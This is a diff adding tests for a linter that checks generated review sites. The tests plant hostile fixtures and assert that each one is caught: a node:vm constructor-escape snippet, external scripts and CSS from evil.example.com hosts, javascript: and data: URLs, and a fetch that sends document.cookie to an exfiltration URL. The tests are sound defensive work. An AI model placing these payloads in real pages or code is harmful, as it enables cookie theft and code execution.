@@ -247,3 +247,213 @@ describe("review-artifact provenance node — resolveArtifactRefs yields a first
     }
   });
 });
+
+describe("check_review_site — parse-don't-execute closes the bypass classes", () => {
+  it("H2: a malicious data/*.js is NOT executed and the linter still terminates", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    const sentinel = "__REVIEW_SITE_PWNED__";
+    try {
+      // The old linter ran this in node:vm — a constructor escape to the real
+      // global + an infinite loop (RCE + DoS in the reviewer's process). Static
+      // parsing must neither set the sentinel nor hang.
+      await writeFile(
+        join(dir, "data", "evil.js"),
+        `this.constructor.constructor("globalThis.${sentinel} = true")();\nwhile (true) {}\n`,
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(sentinel in globalThis, false, "producer code must not execute");
+      // The file assigns no window.* global, so G3 flags it (handled, not run).
+      assert.equal(gate(report, "G3").ok, false, gate(report, "G3").detail);
+    } finally {
+      delete (globalThis as Record<string, unknown>)[sentinel];
+      await cleanup();
+    }
+  });
+
+  it("bypass: an UNQUOTED external script src fails G6", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace(
+          '<script src="assets/app.js"></script>',
+          "<script src=https://cdn.evil.example.com/x.js></script>\n<script src=\"assets/app.js\"></script>",
+        ),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
+      assert.match(gate(report, "G6").detail, /cdn\.evil\.example\.com/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: a data: URL on a <script> fails G2", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace(
+          '<script src="assets/app.js"></script>',
+          '<script src="data:text/javascript,alert(1)"></script>\n<script src="assets/app.js"></script>',
+        ),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
+      assert.match(gate(report, "G2").detail, /data:/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: a javascript: href fails G2", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace('<div class="shell">', '<a href="javascript:alert(1)">x</a>\n<div class="shell">'),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
+      assert.match(gate(report, "G2").detail, /script-URL/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: a CSS @import of an external origin fails G6", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace("</head>", '<style>@import "https://fonts.evil.example.com/x.css";</style>\n</head>'),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
+      assert.match(gate(report, "G6").detail, /fonts\.evil\.example\.com/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: an inline style url() of an external origin fails G6", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace('<div class="shell">', '<div class="shell" style="background:url(https://track.evil.example.com/p.png)">'),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
+      assert.match(gate(report, "G6").detail, /track\.evil\.example\.com/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: an external fetch (concatenated, non-literal) fails G5", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "assets/app.js", (s) =>
+        s.replace('"use strict";', '"use strict";\n  fetch("https://evil.example.com/exfil?d=" + document.cookie);'),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
+      assert.match(gate(report, "G5").detail, /fetch/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: a dynamic import() fails G5", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "assets/app.js", (s) =>
+        s.replace('"use strict";', '"use strict";\n  import("https://evil.example.com/x.js");'),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
+      assert.match(gate(report, "G5").detail, /import/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: a dangling relative href (no file) fails G2", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace('href="assets/app.css"', 'href="assets/missing.css"'),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
+      assert.match(gate(report, "G2").detail, /missing file/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("bypass: an inline <script> with a bad getElementById fails G4", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace(
+          '<script src="data/manifest.js"></script>',
+          '<script>document.getElementById("ghost-node");</script>\n<script src="data/manifest.js"></script>',
+        ),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G4").ok, false, gate(report, "G4").detail);
+      assert.match(gate(report, "G4").detail, /ghost-node/);
+    } finally {
+      await cleanup();
+    }
+  });
+});
+
+describe("check_review_site — G8 fidelity fails when required-but-unverifiable (H1/H1b)", () => {
+  it("H1: requireFidelity with no measurement on disk fails G8", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      // Manifest names a measurement that isn't present under measurementsRoot.
+      await writeFile(
+        join(dir, "data", "manifest.js"),
+        `window.REVIEW_MANIFEST = {\n  sample_id: "task-x",\n  produced_from: { measurement: "measurements/results.json@${"a".repeat(64)}" },\n  verdict_schema: "review-verdict/1",\n  data_globals: ["REVIEW_MANIFEST", "REVIEW_DATA"],\n};\n`,
+      );
+      const report = await checkReviewSite({
+        siteDir: dir,
+        cdnAllowlist: [],
+        measurementsRoot: dir,
+        expectedSampleId: "task-x",
+        requireFidelity: true,
+      });
+      assert.equal(report.fidelity, "unverified");
+      assert.equal(gate(report, "G8").ok, false, gate(report, "G8").detail);
+      assert.match(gate(report, "G8").detail, /fidelity required/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("H1b: a manifest sample_id that isn't the harness run id fails G8", async () => {
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      const resultsRel = join("measurements", "results.json");
+      await mkdir(join(dir, "measurements"), { recursive: true });
+      const bytes = JSON.stringify({ slope: 0.12, n: 200 }); // toy stats: no sample_id
+      await writeFile(join(dir, resultsRel), bytes);
+      const hash = createHash("sha256").update(bytes).digest("hex");
+      await writeFile(
+        join(dir, "data", "manifest.js"),
+        `window.REVIEW_MANIFEST = {\n  sample_id: "attacker-picked",\n  produced_from: { measurement: "measurements/results.json@${hash}" },\n  verdict_schema: "review-verdict/1",\n  data_globals: ["REVIEW_MANIFEST", "REVIEW_DATA"],\n};\n`,
+      );
+      const report = await checkReviewSite({
+        siteDir: dir,
+        cdnAllowlist: [],
+        measurementsRoot: dir,
+        expectedSampleId: "task-2026-07-09-001",
+        requireFidelity: true,
+      });
+      assert.equal(report.fidelity, "verified", "hash matched, so fidelity is verified");
+      assert.equal(gate(report, "G8").ok, false, gate(report, "G8").detail);
+      assert.match(gate(report, "G8").detail, /run id/);
+    } finally {
+      await cleanup();
+    }
+  });
+});
